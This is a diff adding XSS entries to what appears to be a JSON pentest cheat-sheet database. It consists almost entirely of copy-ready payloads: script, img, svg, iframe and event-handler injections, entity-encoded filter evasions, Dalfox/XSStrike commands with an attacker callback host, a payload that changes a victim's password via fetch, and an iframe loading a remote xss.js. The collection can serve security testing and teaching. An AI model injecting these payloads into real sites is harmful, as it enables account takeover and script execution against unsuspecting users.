@@ -441,5 +441,138 @@
       "commands"
     ],
     "category": "commands"
+  },
+  {
+    "id": 37,
+    "title": "XSS (Cross-Site Scripting) Automation",
+    "content": "Dalfox\n<copycode>\n# -b: Callback url <br>\ndalfox url https://example.com/?q=test -b http://<attack-ip>:<attack-port><br>\n<br>\n# -X: Method<br>\n# --data: POST data<br>\ndalfox url https://example.com/contact -X POST --data \"email=test&message=test\" -b http://<attack-ip>:<attack-port><br>\n</copycode><br>\nXSStrike<br>\n<copycode>\n# GET request<br>\npython xsstrike.py -u http://vulnerable.com/?param=test<br>\n<br>\n# POST reqeust<br>\npython xsstrike.py -u http://vulnerable.com/post --data \"username=test&email=test&comment=test\"<br>\n<br>\n# data as JSON<br>\npython xsstrike.py -u http://vulnerable.com/comment --data '{\"comment\": \"test\"}' --json<br>\n</copycode><br>\n",
+    "keywords": [
+      "xss",
+      "automation",
+      "xss tool",
+      "xsstrike",
+      "dalfox"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 38,
+    "title": "XSS payloads script tag",
+    "content": "<copycode>\n<script>alert(1)</script><br>\n\"><script>alert(1)</script><br>\n'></script><script>alert(1)</script><br>\n<script>onerror=alert;throw 123</script><br>\n<script>{onerror=alert}throw 123</script><br>\n<script>throw onerror=alert,'hello',123,'world'</script><br>\n<script>fetch('/profile?new_password=password');</script><br>\n</textarea><script>alert(1)</script><br>\n<br>\n%3Cscript%3Ealert%281%29%3C%2Fscript%3E<br>\n<br>\n%0D%0A<script>alert(1)</script><br>\n%0D%0A%0D%0A<script>alert(1)</script><br>\n<br>\n';alert(1);'<br>\n\n</copycode>",
+    "keywords": [
+      "xss",
+      "payloads",
+      "script",
+      "tag"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 39,
+    "title": "XSS payloads,  Img Tags",
+    "content": "<copycode><br>\n\" src=1 onerror=alert(1)><br>\n<><img src=1 onerror=alert(1)><br>\n\"><img src=1 onerror=alert(1)><br>\n\"></span><img src=1 onerror=alert(1)><br>\n<br>\n<img src=\"javascript:alert(1)\"><br>\n<img src=\"jav ascript:alert(1)\"><br>\n<img src=\"jav&#x09;ascript:alert(1)\"><br>\n<img src=\"jav&#x0A;ascript:alert(1)\"><br>\n<br>\n<img dynsrc=\"javascript:alert(1)\"><br>\n<img lowsrc=\"javascript:alert(1)\"><br>\n<br>\n<img src=http://10.0.0.1/><br>\n<br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "payloads",
+      "img",
+      "image",
+      "tag"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 40,
+    "title": "xss payload SVG tag",
+    "content": "<copycode><br>\n\"><svg onload=alert(1)><br>\n<svg onmouseover=\"alert(1)\"></svg><br>\n<svg><animatetransform onclick=\"alert(1)\"></svg><br>\n<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a><br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "payload",
+      "svg",
+      "tag"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 41,
+    "title": "xss input tag",
+    "content": "<copycode>\n<input autofocus onfocus=alert(1)>\n</copycode>",
+    "keywords": [
+      "xss",
+      "payload",
+      "input",
+      "tag"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 42,
+    "title": "xss payload select tag",
+    "content": "<copycode>\n<select autofocus onfocus=alert(1)>\n</copycode>\n",
+    "keywords": [
+      "xss",
+      "payload",
+      "select",
+      "tag"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 43,
+    "title": "xss, payload, anchor tag",
+    "content": "<copycode>\n<a onmouseover=alert(1)>click</a><br>\n<a href=\"javascript:alert(1)\">Click</a><br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "payload",
+      "anchor",
+      "tag"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 44,
+    "title": "xss Iframe tags",
+    "content": "<copycode>\n<iframe src=\"javascript:alert(1)\"></iframe><br>\n<iframe src=http://10.0.0.1:8000/xss.js></iframe><br>\n<iframe onload=alert(1)></iframe><br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "Iframe",
+      "tags",
+      "payload"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 45,
+    "title": "xss body tag",
+    "content": "<copycode>\n<body onload=alert(/XSS/.source)><br>\n<body background=\"javascript:alert(1)\"><br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "body",
+      "tag",
+      "payloads"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 46,
+    "title": "XSS HTML Entity",
+    "content": "<copycode>\n<!-- <img src=javascript:alert('XSS')> --><br>\n<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><br>\n<br>\n<!-- onerror=\"javascript:alert('XSS')\" --><br>\n<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\"><br>\n<br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "payloads",
+      "html",
+      "entity"
+    ],
+    "category": "xss"
+  },
+  {
+    "id": 47,
+    "title": "other some xss payloads",
+    "content": "<copycode>\n\" onmouseleave='alert(1)'\"><br>\n<br>\njavascript:alert(1)<br>\n\\\"-alert(1)//<br>\n<br>\n/?q=&subparam=--><script>alert(1)</script><br>\n/index.php#value='><script>alert(1)</script><br>\n</copycode>",
+    "keywords": [
+      "xss",
+      "payloads",
+      "script"
+    ],
+    "category": "xss"
   }
 ]
